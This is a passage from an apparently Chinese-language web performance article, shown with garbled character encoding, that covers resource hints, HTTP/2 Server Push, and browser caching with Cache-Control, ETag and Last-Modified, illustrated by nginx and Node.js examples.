class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- åŸºæœ¬ç”¨æ³• --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot;&gt;<br><br>&lt;!-- æ‰©å±•èµ„æºæç¤º --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><p>é“¾æ¥å»ºç«‹è¿‡ç¨‹ï¼š</p><pre class="mermaid">graph LRA[preconnect] --> B[DNSè§£æ]A --> C[TCPæ¡æ‰‹]A --> D[TLSåå•†] D --> E[ä¿æŒè¿æ¥æ± ]</pre><ul><li>èŠ‚çœæ—¶é—´ï¼šæå‰å®Œæˆ100-500msçš„ç½‘ç»œæ¡æ‰‹</li><li>é€‚ç”¨åœºæ™¯ï¼šå·²çŸ¥éœ€è¯·æ±‚çš„ç¬¬ä¸‰æ–¹åŸŸï¼ˆGoogle Fonts&#x2F;Analyticsï¼‰</li></ul><p>å®æ–½è§„èŒƒï¼š</p><ul><li>è·¨åŸŸè¦æ±‚ï¼šCORSèµ„æºéœ€åŠ  crossorigin</li><li>è¿æ¥ä¿æŒï¼šé»˜è®¤10ç§’æ— è¯·æ±‚åˆ™å…³é—­ï¼ˆChromeè¡Œä¸ºï¼‰</li></ul><p>æ™ºèƒ½å†³ç­–ï¼š</p><ul><li>é«˜é¢‘åŸŸï¼šä¸»CDN&#x2F;é™æ€èµ„æºåŸŸï¼ˆå¦‚ static.example.comï¼‰</li><li>å…³é”®ç¬¬ä¸‰æ–¹ï¼šæ”¯ä»˜SDK&#x2F;è®¤è¯æœåŠ¡ï¼ˆå¦‚ auth0.comï¼‰</li><li>é¿å…è¿‡åº¦ï¼š&gt;4ä¸ªpreconnectå¯èƒ½è¢«æµè§ˆå™¨å¿½ç•¥</li></ul><p><strong>ç»„åˆä¼˜åŒ–ç­–ç•¥</strong></p><p>(1) åˆ†é˜¶æ®µèµ„æºæç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;head&gt;<br>  &lt;!-- é˜¶æ®µ1ï¼šå…³é”®èµ„æº --&gt;<br>  &lt;link rel=&quot;preload&quot; href=&quot;main.css&quot; as=&quot;style&quot;&gt;<br>  <br>  &lt;!-- é˜¶æ®µ2ï¼šç¬¬ä¸‰æ–¹è¿æ¥ --&gt;<br>  &lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot;&gt;<br>  <br>  &lt;!-- é˜¶æ®µ3ï¼šé¢„æµ‹æ€§èµ„æº --&gt;<br>  &lt;link rel=&quot;prefetch&quot; href=&quot;checkout.js&quot; as=&quot;script&quot;&gt;<br>&lt;/head&gt;<br></code></pre></td></tr></table></figure><p>(2) ä¼˜å…ˆçº§å†²çªè§„é¿</p><table><thead><tr><th align="left">èµ„æºç±»å‹</th><th align="left">preload</th><th align="left">prefetch</th><th align="left">é£é™©</th></tr></thead><tbody><tr><td align="left">é¦–å±å›¾ç‰‡</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">é‡å¤åŠ è½½æµªè´¹å¸¦å®½</td></tr><tr><td align="left">éé¦–å±ç»„ä»¶JS</td><td align="left">âŒ</td><td align="left">âœ…</td><td align="left">å¼±ç½‘ç¯å¢ƒå»¶è¿Ÿå…³é”®è¯·æ±‚</td></tr><tr><td align="left">å­—ä½“æ–‡ä»¶</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">ä¸åŠ crossoriginå¤±æ•ˆ</td></tr></tbody></table><h3 id="HTTP-2-Server-Push-ç­–ç•¥è®¾è®¡"><a href="#HTTP-2-Server-Push-ç­–ç•¥è®¾è®¡" class="headerlink" title="HTTP&#x2F;2 Server Push ç­–ç•¥è®¾è®¡"></a>HTTP&#x2F;2 Server Push ç­–ç•¥è®¾è®¡</h3><p><strong>å·¥ä½œåŸç†</strong></p><pre class="mermaid">sequenceDiagram    participant Client as æµè§ˆå™¨    participant Server as æœåŠ¡å™¨    Client->>Server: è¯·æ±‚ index.html    Server->>Client: å“åº” HTML + PUSH_PROMISE å¸§ï¼ˆå£°æ˜æ¨é€èµ„æºï¼‰    Server->>Client: åŒæ—¶æ¨é€ style.css å’Œ script.js    Client->>Server: æ— éœ€å†è¯·æ±‚ style.css/script.js</pre><ul><li>ä¸»åŠ¨æ¨é€ï¼šæœåŠ¡å™¨åœ¨å“åº”ä¸»è¯·æ±‚æ—¶ä¸»åŠ¨å‘é€å…³è”èµ„æº</li><li>åè®®å±‚å®ç°ï¼šé€šè¿‡ PUSH_PROMISE å¸§å£°æ˜å³å°†æ¨é€çš„èµ„æº</li><li>å®¢æˆ·ç«¯ç¼“å­˜ï¼šæµè§ˆå™¨å°†æ¨é€èµ„æºå­˜å…¥ç¼“å­˜ï¼Œé‡åˆ°å¯¹åº”æ ‡ç­¾æ—¶ç›´æ¥ä½¿ç”¨</li></ul><p><strong>ä¸ä¼ ç»Ÿä¼˜åŒ–çš„å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">HTTP&#x2F;1.1 èµ„æºåˆå¹¶</th><th align="left">HTTP&#x2F;2 Server Push</th></tr></thead><tbody><tr><td align="left">è¯·æ±‚æ•°é‡</td><td align="left">å‡å°‘ï¼ˆåˆå¹¶æ–‡ä»¶ï¼‰</td><td align="left">ä¸å‡å°‘ä½†å¹¶è¡Œä¼ è¾“</td></tr><tr><td align="left">ç¼“å­˜æ•ˆç‡</td><td align="left">ä½ï¼ˆæ•´åŒ…ç¼“å­˜ï¼‰</td><td align="left">é«˜ï¼ˆèµ„æºç‹¬ç«‹ç¼“å­˜ï¼‰</td></tr><tr><td align="left">æ›´æ–°ç²’åº¦</td><td align="left">æ•´æ–‡ä»¶æ›´æ–°</td><td align="left">å•æ–‡ä»¶æ›´æ–°</td></tr><tr><td align="left">å…³é”®è·¯å¾„ä¼˜åŒ–</td><td align="left">æœ‰é™</td><td align="left">æ˜¾è‘—ï¼ˆé¢„ç½®å…³é”®èµ„æºï¼‰</td></tr></tbody></table><p><strong>æ¨é€ç­–ç•¥è®¾è®¡åŸåˆ™</strong></p><p>æ¨é€å†³ç­–çŸ©é˜µï¼š</p><table><thead><tr><th align="left">èµ„æºç±»å‹</th><th align="left">æ˜¯å¦æ¨é€</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left">é¦–å±å…³é”®CSS</td><td align="left">âœ…</td><td align="left">æ¶ˆé™¤æ¸²æŸ“é˜»å¡</td></tr><tr><td align="left">é¦–å±å…³é”®JS</td><td align="left">âœ…</td><td align="left">æå‰ç¼–è¯‘æ‰§è¡Œ</td></tr><tr><td align="left">é¦–å±å¤§å›¾</td><td align="left">âœ…</td><td align="left">æå‡LCP</td></tr><tr><td align="left">éé¦–å±JS&#x2F;CSS</td><td align="left">âŒ</td><td align="left">æµªè´¹å¸¦å®½ï¼Œå¯èƒ½æŠ¢å å…³é”®èµ„æº</td></tr><tr><td align="left">ä½é¢‘ä½¿ç”¨èµ„æº</td><td align="left">âŒ</td><td align="left">ç¼“å­˜åˆ©ç”¨ç‡ä½</td></tr><tr><td align="left">ç”¨æˆ·ç‰¹å®šå†…å®¹</td><td align="left">âŒ</td><td align="left">æ— æ³•é¢„åˆ¤ç”¨æˆ·éœ€æ±‚</td></tr></tbody></table><p>æ™ºèƒ½æ¨é€è§¦å‘æ¡ä»¶:</p><ul><li>åŸºäºHTMLä¾èµ–åˆ†æ: è§£æHTMLä¸­çš„ <code>&lt;link&gt;, &lt;script&gt;</code> æ ‡ç­¾è‡ªåŠ¨æ¨é€</li><li>é…ç½®ç™½åå•ï¼š</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx é…ç½®ç¤ºä¾‹</span><br><span class="hljs-attribute">http2_push</span> /static/css/core.css; <br><span class="hljs-attribute">http2_push</span> /static/js/main.js;<br></code></pre></td></tr></table></figure><ul><li>åŠ¨æ€å†³ç­–ï¼ˆéœ€ç¼–ç¨‹å®ç°ï¼‰</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Node.js åŠ¨æ€æ¨é€</span><br>res.<span class="hljs-property">stream</span>.<span class="hljs-title function_">pushStream</span>(&#123; <span class="hljs-string">&#x27;:path&#x27;</span>: <span class="hljs-string">&#x27;/critical.css&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">err, pushStream</span>) =&gt;</span> &#123;<br>  pushStream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;/path/to/critical.css&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>é£é™©è§„é¿ç­–ç•¥</strong></p><table><thead><tr><th align="left">é£é™©</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">æ¨é€å†—ä½™èµ„æº</td><td align="left">é…ç½®ETagéªŒè¯ï¼Œå®¢æˆ·ç«¯ç¼“å­˜å­˜åœ¨æ—¶è·³è¿‡æ¨é€</td></tr><tr><td align="left">å¸¦å®½ç«äº‰</td><td align="left">é™åˆ¶æ¨é€èµ„æºæ•°é‡ï¼ˆâ‰¤3ä¸ªï¼‰</td></tr><tr><td align="left">é˜Ÿå¤´é˜»å¡</td><td align="left">è®¾ç½®ä¼˜å…ˆçº§æƒé‡ï¼ˆWeightï¼‰</td></tr><tr><td align="left">ç¼“å­˜æ±¡æŸ“</td><td align="left">ä¸ºæ¨é€èµ„æºè®¾ç½®çŸ­ç¼“å­˜ï¼ˆmax-age&#x3D;300ï¼‰</td></tr></tbody></table><p><strong>ä½¿ç”¨å‰æ£€æŸ¥æ¸…å•</strong></p><ol><li>ç¡®è®¤æœåŠ¡å™¨æ”¯æŒ HTTP&#x2F;2ï¼ˆNginx â‰¥ 1.13.9ï¼‰</li><li>ä»…æ¨é€ â‰¤3ä¸ªå…³é”®æ¸²æŸ“è·¯å¾„èµ„æº</li><li>ä¸ºæ¨é€èµ„æºè®¾ç½®ç‰ˆæœ¬åŒ–è·¯å¾„</li><li>å®ç°ç¼“å­˜çŠ¶æ€éªŒè¯ï¼ˆCache-Digestï¼‰</li><li>ç›‘æ§æ¨é€èµ„æºå‘½ä¸­ç‡ï¼ˆCDNæ—¥å¿—ï¼‰</li><li>é…ç½®é™çº§ç­–ç•¥ï¼ˆä¸æ”¯æŒHTTP&#x2F;2æ—¶å›é€€preloadï¼‰</li></ol><h2 id="2-2-ç¼“å­˜æœºåˆ¶"><a href="#2-2-ç¼“å­˜æœºåˆ¶" class="headerlink" title="2.2 ç¼“å­˜æœºåˆ¶"></a>2.2 ç¼“å­˜æœºåˆ¶</h2><h3 id="å¼ºç¼“å­˜ï¼šCache-Control-Expires"><a href="#å¼ºç¼“å­˜ï¼šCache-Control-Expires" class="headerlink" title="å¼ºç¼“å­˜ï¼šCache-Control &#x2F; Expires"></a>å¼ºç¼“å­˜ï¼šCache-Control &#x2F; Expires</h3><p><strong>å·¥ä½œåŸç†</strong></p><pre class="mermaid">sequenceDiagram    participant Browser as æµè§ˆå™¨    participant Cache as æœ¬åœ°ç¼“å­˜    participant Server as æœåŠ¡å™¨        Browser->>Cache: è¯·æ±‚èµ„æº    alt ç¼“å­˜æœ‰æ•ˆ        Cache-->>Browser: ç›´æ¥è¿”å›ç¼“å­˜(çŠ¶æ€ç 200 from cache)    else ç¼“å­˜å¤±æ•ˆ        Browser->>Server: å‘é€è¯·æ±‚        Server-->>Browser: è¿”å›èµ„æº + æ–°ç¼“å­˜å¤´    end</pre><ul><li>æ— ç½‘ç»œè¯·æ±‚ï¼šå‘½ä¸­ç¼“å­˜æ—¶ä¸äº§ç”Ÿä»»ä½•ç½‘ç»œæµé‡</li><li>HTTPçŠ¶æ€ç ï¼š<ul><li>Chromeï¼š200 (from disk cache) æˆ– 200 (from memory cache)</li><li>Firefoxï¼š200 OK (cached)</li></ul></li></ul><p><strong>Expiresï¼šç»å¯¹æ—¶é—´æ§åˆ¶</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>Wed, 21 Oct 2025 07:28:00 GMT<br></code></pre></td></tr></table></figure><ul><li>åŸºäºæœåŠ¡ç«¯æ—¶é—´ï¼šæŒ‡å®šèµ„æºçš„å…·ä½“è¿‡æœŸæ—¶é—´ç‚¹</li><li>æ—¶åŒºè¦æ±‚ï¼šå¿…é¡»ä½¿ç”¨ GMT æ ¼å¼</li><li>è‡´å‘½ç¼ºé™·ï¼š<ul><li>ä¾èµ–å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯æ—¶é’Ÿä¸¥æ ¼åŒæ­¥ï¼ˆæ—¶å·®å¯¼è‡´ç¼“å­˜å¤±æ•ˆï¼‰</li><li>æ— æ³•åº”å¯¹æ—¶åŒºåˆ‡æ¢ï¼ˆå¦‚å¤ä»¤æ—¶è°ƒæ•´ï¼‰</li></ul></li><li>ä½¿ç”¨åœºæ™¯ï¼š<ul><li>ä»…éœ€å…¼å®¹IE8åŠä»¥ä¸‹æµè§ˆå™¨çš„ç³»ç»Ÿ</li><li>é™æ€èµ„æºç‰ˆæœ¬å˜æ›´é¢‘ç‡æä½ï¼ˆå¦‚å¹´æ›´ï¼‰</li></ul></li></ul><p><strong>Cache-Controlï¼šç°ä»£ç¼“å­˜æ§åˆ¶</strong></p><p>æŒ‡ä»¤å…¨é›†ï¼ˆå¸¸ç”¨20+æŒ‡ä»¤ï¼‰ï¼š</p><table><thead><tr><th align="left">æŒ‡ä»¤ç±»å‹</th><th align="left">å…³é”®æŒ‡ä»¤</th><th align="left">å€¼æ ¼å¼</th><th align="left">åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td align="left">è¿‡æœŸæ§åˆ¶</td><td align="left">max-age</td><td align="left">ç§’æ•°ï¼ˆå¦‚ 3600ï¼‰</td><td align="left">èµ„æºæœ‰æ•ˆæœŸï¼ˆç›¸å¯¹æ—¶é—´ï¼‰</td></tr><tr><td align="left">å¯ç¼“å­˜æ€§</td><td align="left">public<br>private<br>no-store</td><td align="left">æ— å€¼<br>æ— å€¼<br>æ— å€¼</td><td align="left">å…è®¸ä»£ç†&#x2F;CDNç¼“å­˜<br>ä»…é™ç”¨æˆ·æµè§ˆå™¨ç¼“å­˜<br>ç¦æ­¢ä»»ä½•ç¼“å­˜</td></tr><tr><td align="left">é‡æ–°éªŒè¯</td><td align="left">must-revalidate</td><td align="left">æ— å€¼</td><td align="left">è¿‡æœŸåå¿…é¡»å›æºéªŒè¯</td></tr><tr><td align="left">ç‰¹æ®Šè¡Œä¸º</td><td align="left">no-cache<br>immutable</td><td align="left">æ— å€¼<br>æ— å€¼</td><td align="left">æ¯æ¬¡ä½¿ç”¨å‰éœ€éªŒè¯ï¼ˆéå­—é¢æ„æ€ï¼‰<br> æ°¸ä¸å˜æ›´èµ„æºï¼ˆç‰ˆæœ¬åŒ–è·¯å¾„é€‚ç”¨ï¼‰</td></tr><tr><td align="left">ç¼“å­˜ç»§æ‰¿</td><td align="left">s-maxage</td><td align="left">ç§’æ•°</td><td align="left">ä»£ç†æœåŠ¡å™¨ä¸“ç”¨max-age</td></tr></tbody></table><p>ä¼˜å…ˆçº§è§„åˆ™ï¼š</p><pre class="mermaid">graph TB    A[Cache-Control] --> B[no-store] -->|æœ€é«˜| C[ç¦æ­¢ç¼“å­˜]    A --> D[no-cache] -->|æ¬¡é«˜| E[æ¯æ¬¡éªŒè¯]    A --> F[max-age] -->|åŸºç¡€| G[ç›¸å¯¹æ—¶é—´ç¼“å­˜]    A --> H[Expires] -->|å…œåº•| I[ç»å¯¹æ—¶é—´ç¼“å­˜]</pre><p><strong>æµè§ˆå™¨ç¼“å­˜å­˜å‚¨æœºåˆ¶</strong></p><table><thead><tr><th align="left">ç¼“å­˜ç±»å‹</th><th align="left">å­˜å‚¨ä½ç½®</th><th align="left">ç”Ÿå‘½å‘¨æœŸ</th><th align="left">å®¹é‡é™åˆ¶</th></tr></thead><tbody><tr><td align="left">Memory Cache</td><td align="left">ç³»ç»Ÿå†…å­˜</td><td align="left">è¿›ç¨‹å…³é—­å³æ¸…é™¤</td><td align="left">å°ï¼ˆçº¦10MBï¼‰</td></tr><tr><td align="left">Disk Cache</td><td align="left">ç¡¬ç›˜åˆ†åŒº</td><td align="left">æŒä¹…åŒ–å­˜å‚¨</td><td align="left">å¤§ï¼ˆæ•°ç™¾MBï¼‰</td></tr></tbody></table><p><strong>èµ„æºåˆ†é…è§„åˆ™</strong></p><ul><li>å¤§æ–‡ä»¶(&gt;1MB) â€“&gt; Disk Cacheé•¿æœŸä¿ç•™</li><li>å°æ–‡ä»¶ â€“&gt; Memory CacheçŸ­æœŸå¿«é€Ÿè¯»å–</li><li>é¢„åŠ è½½èµ„æº â€“&gt; Memory Cacheé¡µé¢å…³é—­å³æ¸…é™¤</li></ul><p><strong>å¼ºç¼“å­˜å¤±æ•ˆç­–ç•¥</strong></p><p>(1) ä¸»åŠ¨æ›´æ–°æœºåˆ¶</p><ul><li>URLç‰ˆæœ¬åŒ–ï¼ˆæœ€é«˜æ•ˆï¼‰ï¼š<code>/main.v2.3.1.js</code></li><li>æŸ¥è¯¢å‚æ•°å˜æ›´ï¼ˆéƒ¨åˆ†CDNä¸å…¼å®¹ï¼‰ï¼š<code>/data.json?v=20231021</code></li><li>æ–‡ä»¶åæŒ‡çº¹ï¼ˆæ„å»ºå·¥å…·è‡ªåŠ¨ç”Ÿæˆï¼‰ï¼š<code>/app.8e9d2a.js</code></li></ul><p>(2) è¢«åŠ¨æ›´æ–°æœºåˆ¶</p><ul><li>max-age è¿‡æœŸåè‡ªåŠ¨å¤±æ•ˆ</li><li>ç”¨æˆ·å¼ºåˆ¶åˆ·æ–°ï¼ˆCtrl+F5ï¼‰è·³è¿‡ç¼“å­˜</li></ul><p><strong>æ€»ç»“</strong></p><ol><li>æ‰€æœ‰é™æ€èµ„æºè®¾ç½® public</li><li>ç‰ˆæœ¬åŒ–èµ„æºæ·»åŠ  immutable</li><li>åŠ¨æ€å†…å®¹è®¾ç½® private + é€‚å½“ max-age</li><li>æ•æ„Ÿæ•°æ®æ˜ç¡® no-store</li><li>é…ç½® s-maxage æ§åˆ¶CDNç¼“å­˜</li><li>å¼ƒç”¨ Expiresï¼ˆä¼˜å…ˆä½¿ç”¨ Cache-Controlï¼‰</li></ol><h3 id="åå•†ç¼“å­˜ï¼šETag-Last-Modified"><a href="#åå•†ç¼“å­˜ï¼šETag-Last-Modified" class="headerlink" title="åå•†ç¼“å­˜ï¼šETag &#x2F; Last-Modified"></a>åå•†ç¼“å­˜ï¼šETag &#x2F; Last-Modified</h3><p><strong>å·¥ä½œåŸç†</strong></p><pre class="mermaid">sequenceDiagram    participant Browser as æµè§ˆå™¨    participant Server as æœåŠ¡å™¨        Browser->>Server: è¯·æ±‚èµ„æºï¼ˆæºå¸¦ If-None-Match/If-Modified-Sinceï¼‰    alt èµ„æºæœªå˜æ›´        Server-->>Browser: 304 Not Modifiedï¼ˆç©ºå“åº”ä½“ï¼‰        Browser->>Browser: ä½¿ç”¨æœ¬åœ°ç¼“å­˜    else èµ„æºå·²å˜æ›´        Server-->>Browser: 200 OK + æ–°èµ„æº + æ–°éªŒè¯å¤´    end</pre><ul><li>æ¡ä»¶è¯·æ±‚ï¼šæµè§ˆå™¨æºå¸¦éªŒè¯å™¨è¯¢é—®èµ„æºæ˜¯å¦å˜æ›´</li><li>ç½‘ç»œäº¤äº’ï¼šæ— è®ºæ˜¯å¦å˜æ›´éƒ½äº§ç”Ÿç½‘ç»œè¯·æ±‚</li><li>çŠ¶æ€ç ï¼š<ul><li>304 Not Modifiedï¼šèµ„æºæœªå˜æ›´</li><li>200 OKï¼šèµ„æºå·²æ›´æ–°</li></ul></li></ul><p><strong>Last-Modifiedï¼šåŸºäºæ—¶é—´æˆ³</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">### é¦–æ¬¡å“åº”<br><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Wed, 21 Oct 2023 07:28:00 GMT<br><br><span class="language-apache"><span class="hljs-comment">### åç»­è¯·æ±‚</span></span><br><span class="language-apache"><span class="hljs-attribute">GET</span> /resource</span><br><span class="language-apache"><span class="hljs-attribute">If</span>-Modified-Since: Wed, <span class="hljs-number">21</span> Oct <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">28</span>:<span class="hljs-number">00</span> GMT</span><br></code></pre></td></tr></table></figure><ul><li>æ—¶é—´ç²¾åº¦ï¼šæœ€å°å•ä½ä¸ºç§’ï¼ˆ1ç§’å†…å¤šæ¬¡ä¿®æ”¹æ— æ³•è¯†åˆ«ï¼‰</li><li>éªŒè¯é€»è¾‘ï¼šæœåŠ¡å™¨å¯¹æ¯”å½“å‰èµ„æºä¿®æ”¹æ—¶é—´ä¸è¯·æ±‚å¤´æ—¶é—´</li></ul><p>è‡´å‘½ç¼ºé™·ï¼š</p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">é—®é¢˜</th><th align="left">åæœ</th></tr></thead><tbody><tr><td align="left">æ–‡ä»¶å†…å®¹ä¸å˜ä½†æ—¶é—´æ›´æ–°</td><td align="left">æ—¶é—´æˆ³å˜åŒ–è§¦å‘æ— æ•ˆæ›´æ–°</td><td align="left">å¸¦å®½æµªè´¹</td></tr><tr><td align="left">åˆ†å¸ƒå¼æœåŠ¡å™¨æ—¶é—´ä¸åŒæ­¥</td><td align="left">ä¿®æ”¹æ—¶é—´åå·®å¯¼è‡´ç¼“å­˜å¤±æ•ˆ</td><td align="left">é¢‘ç¹è¯·æ±‚</td></tr><tr><td align="left">1ç§’å†…å¤šæ¬¡ä¿®æ”¹</td><td align="left">æ—¶é—´æœªå˜ä½†å†…å®¹å·²æ”¹</td><td align="left">è¿”å›è¿‡æœŸå†…å®¹</td></tr></tbody></table><p><strong>ETagï¼šåŸºäºå†…å®¹æŒ‡çº¹</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">### é¦–æ¬¡å“åº”<br><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;13a-17d5ecc5d10&quot;<br><br><span class="language-routeros"><span class="hljs-comment">### åç»­è¯·æ±‚</span></span><br><span class="language-routeros"><span class="hljs-built_in">GET</span> <span class="hljs-built_in">/resource</span></span><br><span class="hljs-built_in"><span class="language-routeros"></span>If-None-Match: <span class="hljs-string">&quot;13a-17d5ecc5d10&quot;</span></span><br></code></pre></td></tr></table></figure><ul><li>æŒ‡çº¹ç”Ÿæˆç®—æ³•ï¼š<ul><li>å¼ºéªŒè¯å™¨ï¼šå†…å®¹å“ˆå¸Œå€¼ï¼ˆå¦‚ SHA-1ï¼‰</li><li>å¼±éªŒè¯å™¨ï¼ˆW&#x2F;å‰ç¼€ï¼‰ï¼šä»…æ£€æŸ¥è¯­ä¹‰å˜åŒ–ï¼ˆå¦‚ W&#x2F;â€œ13aâ€ï¼‰</li></ul></li><li>ä¼˜å…ˆçº§è§„åˆ™ï¼šETag ä¼˜å…ˆçº§é«˜äº Last-Modified</li></ul><p>ä¼˜åŠ¿å¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">ETag</th><th align="left">Last-Modified</th></tr></thead><tbody><tr><td align="left">ä¿®æ”¹æ£€æµ‹ç²¾åº¦</td><td align="left">å­—èŠ‚çº§ï¼ˆå†…å®¹å“ˆå¸Œï¼‰</td><td align="left">ç§’çº§ï¼ˆæ–‡ä»¶ç³»ç»Ÿæ—¶é—´ï¼‰</td></tr><tr><td align="left">åˆ†å¸ƒå¼ä¸€è‡´æ€§</td><td align="left">ç¨³å®šï¼ˆå†…å®¹å†³å®šæŒ‡çº¹ï¼‰</td><td align="left">ä¾èµ–æ—¶é—´åŒæ­¥</td></tr><tr><td align="left">èµ„æºå˜æ›´è¯†åˆ«</td><td align="left">å†…å®¹ä¸å˜æŒ‡çº¹ä¸€å®šä¸å˜</td><td align="left">æ—¶é—´å¯èƒ½è¯¯å˜</td></tr></tbody></table><p><strong>æœåŠ¡ç«¯éªŒè¯é€»è¾‘</strong></p><p>é…ç½®ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-comment"># å¯ç”¨ETagï¼ˆé»˜è®¤å¼€å¯ï¼‰</span><br>    <span class="hljs-attribute">etag</span> <span class="hljs-literal">on</span>;<br>    <br>    <span class="hljs-comment"># å¼±ETagé…ç½®ï¼ˆèŠ‚çœCPUï¼‰</span><br>    <span class="hljs-attribute">etag_format</span> <span class="hljs-string">&#x27;W/&quot;%x-%t&quot;&#x27;</span>;  <span class="hljs-comment"># æ–‡ä»¶å¤§å°+ä¿®æ”¹æ—¶é—´</span><br>    <br>    <span class="hljs-comment"># ç¦ç”¨Last-Modified</span><br>    <span class="hljs-attribute">add_header</span> Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†³ç­–è¿‡ç¨‹ï¼š</p><pre class="mermaid">graph TD    A[æ”¶åˆ°è¯·æ±‚] --> B{æºå¸¦ If-None-Match?}    B -->|æ˜¯| C[æ¯”è¾ƒETag]    B -->|å¦| D{æºå¸¦ If-Modified-Since?}    D -->|æ˜¯| E[æ¯”è¾ƒæ—¶é—´æˆ³]    D -->|å¦| F[è¿”å›200]    C -->|åŒ¹é…| G[è¿”å›304]    C -->|ä¸åŒ¹é…| F    E -->|æœªä¿®æ”¹| G    E -->|å·²ä¿®æ”¹| F</pre><p><strong>ETag ç”Ÿæˆç­–ç•¥</strong></p><p>æœ€ä½³å®è·µï¼š</p><table><thead><tr><th align="left">èµ„æºç±»å‹</th><th align="left">æ¨èç®—æ³•</th><th align="left">ç¤ºä¾‹</th><th align="left">ç‰¹ç‚¹</th></tr></thead><tbody><tr><td align="left">é™æ€æ–‡ä»¶</td><td align="left">å¼ºETagï¼ˆå†…å®¹å“ˆå¸Œï¼‰</td><td align="left">ETag: â€œ5d83c-17a9â€</td><td align="left">ç²¾ç¡®ä½†æ¶ˆè€—CPU</td></tr><tr><td align="left">åŠ¨æ€API</td><td align="left">å¼±ETagï¼ˆç‰ˆæœ¬å·&#x2F;æ—¶é—´æˆ³ï¼‰</td><td align="left">ETag: W&#x2F;â€œv1.2â€</td><td align="left">é«˜æ•ˆä½†ç²’åº¦ç²—</td></tr><tr><td align="left">å¤§æ–‡ä»¶</td><td align="left">åˆ†æ®µå“ˆå¸Œ</td><td align="left">ETag: â€œ5d83c-17a9:10â€</td><td align="left">æ”¯æŒRangeè¯·æ±‚éªŒè¯</td></tr></tbody></table><p>Node.js å®ç°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-comment">// å¼ºETagç”Ÿæˆ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateStrongEtag</span>(<span class="hljs-params">filePath</span>) &#123;<br>  <span class="hljs-keyword">const</span> content = fs.<span class="hljs-title function_">readFileSync</span>(filePath);<br>  <span class="hljs-keyword">const</span> hash = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>).<span class="hljs-title function_">update</span>(content).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&quot;<span class="hljs-subst">$&#123;hash&#125;</span>&quot;`</span>;<br>&#125;<br><br><span 